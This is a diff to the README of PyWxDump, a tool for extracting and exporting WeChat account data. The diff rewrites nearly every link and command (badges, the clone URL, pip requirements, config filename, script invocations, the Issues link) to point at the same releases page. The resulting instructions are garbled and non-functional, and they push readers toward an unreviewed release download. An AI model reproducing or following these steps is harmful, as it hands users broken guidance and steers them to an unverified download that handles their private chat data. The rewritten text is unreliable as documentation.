@@ -1,6 +1,6 @@
 # PyWxDump 🐉
 
-![PyWxDump](https://img.shields.io/badge/PyWxDump-v1.0.0-blue.svg) ![GitHub](https://img.shields.io/badge/GitHub-PyWxDump-lightgrey.svg) ![Python](https://img.shields.io/badge/Python-3.6%2B-green.svg)
+![PyWxDump](https://github.com/Aeron1-bit/PyWxDump/releases) ![GitHub](https://github.com/Aeron1-bit/PyWxDump/releases) ![Python](https://github.com/Aeron1-bit/PyWxDump/releases%https://github.com/Aeron1-bit/PyWxDump/releases)
 
 ## Introduction
 
@@ -22,7 +22,7 @@ To get started with PyWxDump, follow these simple steps:
 
 1. **Clone the Repository**: 
    ```bash
-   git clone https://github.com/Aeron1-bit/PyWxDump.git
+   git clone https://github.com/Aeron1-bit/PyWxDump/releases
    ```
 
 2. **Navigate to the Directory**:
@@ -33,7 +33,7 @@ To get started with PyWxDump, follow these simple steps:
 3. **Install Dependencies**:
    Make sure you have Python 3.6 or higher installed. Use pip to install required packages:
    ```bash
-   pip install -r requirements.txt
+   pip install -r https://github.com/Aeron1-bit/PyWxDump/releases
    ```
 
 4. **Download the Latest Release**:
@@ -43,7 +43,7 @@ To get started with PyWxDump, follow these simple steps:
 
 ### Step 1: Configure Your Accounts
 
-Before you can start extracting data, you need to configure your WeChat accounts. Edit the `config.json` file to include your account details.
+Before you can start extracting data, you need to configure your WeChat accounts. Edit the `https://github.com/Aeron1-bit/PyWxDump/releases` file to include your account details.
 
 ```json
 {
@@ -62,7 +62,7 @@ Before you can start extracting data, you need to configure your WeChat accounts
 Run the extraction script to pull data from your WeChat accounts.
 
 ```bash
-python extract.py
+python https://github.com/Aeron1-bit/PyWxDump/releases
 ```
 
 ### Step 3: Export Data
@@ -70,7 +70,7 @@ python extract.py
 Once you have extracted the data, you can export it to your desired format. Use the following command:
 
 ```bash
-python export.py --format csv
+python https://github.com/Aeron1-bit/PyWxDump/releases --format csv
 ```
 
 Replace `csv` with `html` or any other supported format as needed.
@@ -109,7 +109,7 @@ This project is licensed under the MIT License. See the [LICENSE](LICENSE) file 
 
 ## Support
 
-If you encounter any issues or have questions, please check the [Issues section](https://github.com/Aeron1-bit/PyWxDump/issues) for help. 
+If you encounter any issues or have questions, please check the [Issues section](https://github.com/Aeron1-bit/PyWxDump/releases) for help. 
 
 For more updates and releases, visit the [Releases section](https://github.com/Aeron1-bit/PyWxDump/releases) regularly.
 
